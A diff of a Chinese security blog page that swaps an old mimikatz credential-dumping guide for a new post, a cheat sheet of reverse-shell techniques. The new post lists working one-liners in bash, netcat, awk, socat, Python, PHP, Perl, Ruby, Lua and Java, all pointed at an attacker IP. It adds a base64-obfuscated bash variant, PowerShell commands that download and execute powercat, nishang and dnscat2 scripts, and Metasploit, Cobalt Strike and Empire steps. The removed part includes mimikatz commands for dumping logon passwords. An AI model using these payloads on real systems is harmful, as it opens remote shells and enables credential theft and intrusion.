@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>工具使用--mimikatz | Beret-81</title>
-  <meta name="keywords" content=" 工具使用、渗透测试 ">
-  <meta name="description" content="工具使用--mimikatz | Beret-81">
+  <title>反弹shell的各种姿势 | Beret-81</title>
+  <meta name="keywords" content=" 反弹shell ">
+  <meta name="description" content="反弹shell的各种姿势 | Beret-81">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="title: 渗透测试–资源网站date: 2020-08-07 11:59:55categories:  渗透测试tags: 渗透测试  渗透测试–资源网站1、网络安全从业者安全导航 渗透师导航 HACK 学习-安全导航 纳维安全导航 APT实战资源 OSINT开源情报与侦察工具  2、 POX&amp;EXP集合 Penetration_Testing_POC  3、红队攻击资源 Red-T">
 <meta property="og:type" content="article">
@@ -428,9 +428,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-工具使用--mimikatz" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-反弹shell的各种姿势" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">工具使用--mimikatz</h1>
+        <h1 class="article-title">反弹shell的各种姿势</h1>
     
     <div class="article-meta">
         
@@ -440,7 +440,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="工具使用">工具使用</a>
+            <a  data-rel="渗透测试">渗透测试</a>
             
         </span>
         
@@ -448,14 +448,14 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color5">工具使用、渗透测试</a>
+            <a class="color3">反弹shell</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-08-11 16:33:58'>2019-03-05 12:56</time>
+            Created At : <time class="date" title='Updated At: 2020-08-13 09:13:23'>2020-08-13 08:59</time>
         
     </div>
     <div class="article-meta">
@@ -477,7 +477,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#工具使用–mimikatz"><span class="toc-text">工具使用–mimikatz</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mimikatz-模块"><span class="toc-text">mimikatz 模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常用功能"><span class="toc-text">常用功能</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、抓取密码"><span class="toc-text">1、抓取密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、哈希攻击"><span class="toc-text">2、哈希攻击</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-反弹shell"><span class="toc-text">Linux 反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势一：bash反弹"><span class="toc-text">姿势一：bash反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势二：nc反弹"><span class="toc-text">姿势二：nc反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势三：awk反弹"><span class="toc-text">姿势三：awk反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势四：telnet反弹"><span class="toc-text">姿势四：telnet反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势五：socat反弹"><span class="toc-text">姿势五：socat反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势六：Python反弹"><span class="toc-text">姿势六：Python反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势七：PHP反弹"><span class="toc-text">姿势七：PHP反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势八：Perl反弹"><span class="toc-text">姿势八：Perl反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势九：Ruby反弹"><span class="toc-text">姿势九：Ruby反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势十：Lua反弹"><span class="toc-text">姿势十：Lua反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势十一：JAVA反弹"><span class="toc-text">姿势十一：JAVA反弹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows反弹shell"><span class="toc-text">Windows反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势一：nc反弹"><span class="toc-text">姿势一：nc反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势二：powershell反弹"><span class="toc-text">姿势二：powershell反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势三：MSF反弹shell"><span class="toc-text">姿势三：MSF反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势四：Cobalt-strike反弹shell"><span class="toc-text">姿势四：Cobalt strike反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势五：Empire反弹shell"><span class="toc-text">姿势五：Empire反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势六：nishang反弹shell"><span class="toc-text">姿势六：nishang反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势七：Dnscat反弹shell"><span class="toc-text">姿势七：Dnscat反弹shell</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -493,68 +493,60 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="工具使用–mimikatz"><a href="#工具使用–mimikatz" class="headerlink" title="工具使用–mimikatz"></a>工具使用–mimikatz</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
-<p>mimikatz是法国人Gentil Kiwi 编写的一款 Windows 平台下的神器，它具备很多功能，其中最主要的功能是直接从 lsass.exe 进程里获取处于active状态账号的明文密码。mimikatz的功能不仅如此，它还可以提升进程权限，注入进程，读取进程内存等等，mimikatz包含了很多本地模块，更像是一个轻量级的调试器。</p>
+        <p>#反弹shell的各种姿势</p>
+<p>原文：<a href="https://mp.weixin.qq.com/s/uXnPctlOBmciHM4Q-7oquw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/uXnPctlOBmciHM4Q-7oquw</a></p>
+<blockquote>
+<p>在渗透过程中，往往因为端口限制而无法直连目标机器，此时需要通过反弹shell来获取一个交互式shell，以便继续深入。</p>
 </blockquote>
-<p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">工具源码</a><br><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">工具下载</a></p>
-<h2 id="mimikatz-模块"><a href="#mimikatz-模块" class="headerlink" title="mimikatz 模块"></a>mimikatz 模块</h2><pre><code>1、输入xx:: ，列出所有可用模块
-cls：清屏
-standard：标准模块，基本命令
-crypto：加密相关模块
-sekurlsa：与证书相关的模块
-kerberos：kerberos模块
-privilege：提权相关模块
-process：进程相关模块
-serivce：服务相关模块
-lsadump：LsaDump模块
-ts：终端服务器模块
-event：事件模块
-misc：杂项模块
-token：令牌操作模块
-vault：Windows 、证书模块
-minesweeper：Mine Sweeper模块
-net：
-dpapi：DPAPI模块（通过API或RAW访问）[数据保护应用程序编程接口]
-busylight：BusyLight Module
-sysenv：系统环境值模块
-sid：安全标识符模块
-iis：IIS XML配置模块
-rpc：mimikatz的RPC控制
-sr98：用于SR98设备和T5577目标的RF模块
-rdm：RDM（830AL）器件的射频模块
-acr：ACR模块
-version：查看版本
-exit：退出
+<blockquote>
+<p>反弹shell是打开内网通道的第一步，也是权限提升过程中至关重要的一步。本文所有姿势整理自网络，并基于同一个假设的前提下完成测试和验证。（假设：攻击者主机为：192.168.99.242，本地监听1234端口，如有特殊情况以下会备注说明。）</p>
+</blockquote>
+<h2 id="Linux-反弹shell"><a href="#Linux-反弹shell" class="headerlink" title="Linux 反弹shell"></a>Linux 反弹shell</h2><h3 id="姿势一：bash反弹"><a href="#姿势一：bash反弹" class="headerlink" title="姿势一：bash反弹"></a>姿势一：bash反弹</h3><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.99.242/1234 0&gt;&amp;1
 
-2、查看某个模块，输入 sekurlsa:: 查看该模块参数
-mimikatz # sekurlsa::
-ERROR mimikatz_doLocal ; &quot;(null)&quot; command of &quot;sekurlsa&quot; module not found !
+base64版：bash -c &apos;{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk5LjI0Mi8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}&apos;
+在线编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html
 
-Module :        sekurlsa
-Full name :     SekurLSA module
-Description :   Some commands to enumerate credentials...
+其他版本：
+exec 5&lt;&gt;/dev/tcp/192.168.99.242/1234;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5;done
+exec /bin/sh 0&lt;/dev/tcp/192.168.99.242/1234 1&gt;&amp;0 2&gt;&amp;0</code></pre><h3 id="姿势二：nc反弹"><a href="#姿势二：nc反弹" class="headerlink" title="姿势二：nc反弹"></a>姿势二：nc反弹</h3><pre><code>nc -e /bin/bash 192.168.99.242 1234</code></pre><h3 id="姿势三：awk反弹"><a href="#姿势三：awk反弹" class="headerlink" title="姿势三：awk反弹"></a>姿势三：awk反弹</h3><pre><code>awk &apos;BEGIN{s=&quot;/inet/tcp/0/192.168.99.242/1234&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)}&apos;</code></pre><h3 id="姿势四：telnet反弹"><a href="#姿势四：telnet反弹" class="headerlink" title="姿势四：telnet反弹"></a>姿势四：telnet反弹</h3><pre><code>备注：需要在攻击主机上分别监听1234和4321端口，执行反弹shell命令后，在1234终端输入命令，4321查看命令执行后的结果。
+telnet 192.168.99.242 1234 | /bin/bash | telnet 192.168.99.242 4321</code></pre><h3 id="姿势五：socat反弹"><a href="#姿势五：socat反弹" class="headerlink" title="姿势五：socat反弹"></a>姿势五：socat反弹</h3><pre><code>socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:192.168.99.242:1234</code></pre><h3 id="姿势六：Python反弹"><a href="#姿势六：Python反弹" class="headerlink" title="姿势六：Python反弹"></a>姿势六：Python反弹</h3><pre><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&apos;192.168.99.242&apos;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&apos;/bin/bash&apos;,&apos;-i&apos;]);&quot;</code></pre><h3 id="姿势七：PHP反弹"><a href="#姿势七：PHP反弹" class="headerlink" title="姿势七：PHP反弹"></a>姿势七：PHP反弹</h3><pre><code>php -r &apos;$sock=fsockopen(&quot;192.168.99.242&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</code></pre><h3 id="姿势八：Perl反弹"><a href="#姿势八：Perl反弹" class="headerlink" title="姿势八：Perl反弹"></a>姿势八：Perl反弹</h3><pre><code>perl -e &apos;use Socket;$i=&quot;192.168.99.242&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;</code></pre><h3 id="姿势九：Ruby反弹"><a href="#姿势九：Ruby反弹" class="headerlink" title="姿势九：Ruby反弹"></a>姿势九：Ruby反弹</h3><pre><code>ruby -rsocket -e&apos;f=TCPSocket.open(&quot;192.168.99.242&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</code></pre><h3 id="姿势十：Lua反弹"><a href="#姿势十：Lua反弹" class="headerlink" title="姿势十：Lua反弹"></a>姿势十：Lua反弹</h3><pre><code>lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;192.168.99.242&apos;,&apos;1234&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</code></pre><h3 id="姿势十一：JAVA反弹"><a href="#姿势十一：JAVA反弹" class="headerlink" title="姿势十一：JAVA反弹"></a>姿势十一：JAVA反弹</h3><pre><code>public class Revs {
+/**
+ * @param args
+ * @throws Exception 
+ */
+public static void main(String[] args) throws Exception {
+        // TODO Auto-generated method stub
+        Runtime r = Runtime.getRuntime();
+        String cmd[]= {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.99.242/1234;cat     &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;};
+        Process p = r.exec(cmd);
+        p.waitFor();
+    }
+}</code></pre><hr>
+<pre><code>保存为Revs.java文件，编译执行，成功反弹shell。
+javac Revs.java 
+java Revs</code></pre><h2 id="Windows反弹shell"><a href="#Windows反弹shell" class="headerlink" title="Windows反弹shell"></a>Windows反弹shell</h2><h3 id="姿势一：nc反弹"><a href="#姿势一：nc反弹" class="headerlink" title="姿势一：nc反弹"></a>姿势一：nc反弹</h3><pre><code>netcat 下载：https://eternallybored.org/misc/netcat/
+服务端反弹：nc 192.168.99.242 1234 -e c:\windows\system32\cmd.exe</code></pre><h3 id="姿势二：powershell反弹"><a href="#姿势二：powershell反弹" class="headerlink" title="姿势二：powershell反弹"></a>姿势二：powershell反弹</h3><pre><code>powercat是netcat的powershell版本，功能免杀性都要比netcat好用的多。
+PS C:\WWW&gt;powershell IEX (New-Object System.Net.Webclient).DownloadString(&apos;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&apos;); powercat -c 192.168.99.242 -p 1234 -e cmd</code></pre><hr>
+<pre><code>下载到目标机器本地执行：
+PS C:\WWW&gt; Import-Module ./powercat.ps1
+PS C:\WWW&gt; powercat -c 192.168.99.242 -p 1234 -e cmd</code></pre><h3 id="姿势三：MSF反弹shell"><a href="#姿势三：MSF反弹shell" class="headerlink" title="姿势三：MSF反弹shell"></a>姿势三：MSF反弹shell</h3><pre><code>使用msfvenom生成相关Payload
+msfvenom -l payloads | grep &apos;cmd/windows/reverse&apos;
+msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.99.242 LPORT=1234</code></pre><h3 id="姿势四：Cobalt-strike反弹shell"><a href="#姿势四：Cobalt-strike反弹shell" class="headerlink" title="姿势四：Cobalt strike反弹shell"></a>姿势四：Cobalt strike反弹shell</h3><pre><code>1、配置监听器：点击Cobalt Strike——&gt;Listeners——&gt;在下方Tab菜单Listeners，点击add。
+2、生成payload：点击Attacks——&gt;Packages——&gt;Windows Executable，保存文件位置。
+3、目标机执行powershell payload</code></pre><h3 id="姿势五：Empire反弹shell"><a href="#姿势五：Empire反弹shell" class="headerlink" title="姿势五：Empire反弹shell"></a>姿势五：Empire反弹shell</h3><pre><code>usestager windows/launcher_vbs
+info
+set Listener test
+execute</code></pre><h3 id="姿势六：nishang反弹shell"><a href="#姿势六：nishang反弹shell" class="headerlink" title="姿势六：nishang反弹shell"></a>姿势六：nishang反弹shell</h3><pre><code>Reverse TCP shell：
+powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com /samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&apos;); Invoke-PowerShellTcp -Reverse -IPAddress 10.1.1.210 -port 1234
 
-         msv  -  Lists LM &amp; NTLM credentials
-     wdigest  -  Lists WDigest credentials
-    kerberos  -  Lists Kerberos credentials
-       tspkg  -  Lists TsPkg credentials
-     livessp  -  Lists LiveSSP credentials
-     cloudap  -  Lists CloudAp credentials
-         ssp  -  Lists SSP credentials
-logonPasswords  -  Lists all available providers credentials
-     process  -  Switch (or reinit) to LSASS process  context
-    minidump  -  Switch (or reinit) to LSASS minidump context
-     bootkey  -  Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials
-         pth  -  Pass-the-hash
-      krbtgt  -  krbtgt!
- dpapisystem  -  DPAPI_SYSTEM secret
-       trust  -  Antisocial
-  backupkeys  -  Preferred Backup Master keys
-     tickets  -  List Kerberos tickets
-       ekeys  -  List Kerberos Encryption Keys
-       dpapi  -  List Cached MasterKeys
-     credman  -  List Credentials Manager</code></pre><h2 id="常用功能"><a href="#常用功能" class="headerlink" title="常用功能"></a>常用功能</h2><h3 id="1、抓取密码"><a href="#1、抓取密码" class="headerlink" title="1、抓取密码"></a>1、抓取密码</h3><pre><code>privilege::debug //提升权限
-sekurlsa::logonpasswords  //获取用户信息及密码</code></pre><h3 id="2、哈希攻击"><a href="#2、哈希攻击" class="headerlink" title="2、哈希攻击"></a>2、哈希攻击</h3>
+Reverse UDP shell：
+powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellUdp.ps1&apos;);
+Invoke-PowerShellUdp -Reverse -IPAddress 10.1.1.210 -port 1234</code></pre><h3 id="姿势七：Dnscat反弹shell"><a href="#姿势七：Dnscat反弹shell" class="headerlink" title="姿势七：Dnscat反弹shell"></a>姿势七：Dnscat反弹shell</h3><pre><code>github项目地址：https://github.com/iagox86/dnscat2
+服务端：
+ruby dnscat2.rb --dns &quot;domain=lltest.com,host=xx.xx.xx.xx&quot; --no-cache -e open -e open 
+
+目标主机：
+powershell IEX (New-Object System.Net.Webclient).DownloadString(&apos;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&apos;);Start-Dnscat2 -Domain lltest.com -DNSServer xx.xx.xx.xx</code></pre>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源。 </span>
     </div>
